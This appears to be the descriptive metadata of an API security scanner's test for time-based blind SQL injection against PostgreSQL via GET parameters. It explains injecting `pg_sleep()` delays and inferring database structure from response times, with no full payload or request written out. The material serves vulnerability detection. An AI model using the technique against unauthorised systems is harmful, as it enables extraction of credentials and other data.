  name: "Time based SQL injection test for PostgreSQL DB for GET method APIs"
  description: "The Time-Based SQL Injection Test for PostgreSQL DB for GET Method APIs is designed to detect blind SQL injection vulnerabilities in APIs that interact with PostgreSQL databases. In this test, attackers inject SQL queries with intentional time delays, such as `pg_sleep()`, into GET request parameters. By observing the response times, the attacker can infer the existence of a vulnerability and potentially gain insight into the database structure or application logic, even when no direct error messages are returned. This test helps identify blind SQL injection risks where traditional error-based techniques may fail."
  details: "The Time-Based SQL Injection Test for PostgreSQL DB for GET Method APIs works by injecting SQL payloads with time-delay functions like `pg_sleep()` into user input fields in GET requests. When the payload is executed, the PostgreSQL database will intentionally pause the response for a specified time, allowing the attacker to measure the delay in the server's response. By analyzing these delays, the attacker can infer sensitive information about the database schema, tables, or even gain unauthorized access to data. This method is particularly effective in situations where error messages are suppressed or when blind injection is the only viable exploitation technique."
  impact: "The impact of the Time-Based SQL Injection Test for PostgreSQL DB for GET Method APIs can be significant, as it allows attackers to extract sensitive database information without triggering visible errors. By analyzing response delays, attackers can infer details about the database structure, including table names, column data, and even retrieve user credentials. This type of attack can lead to unauthorized data access, potential data exfiltration, or further exploitation of the system. If left unaddressed, this vulnerability can compromise the integrity and confidentiality of the entire database."
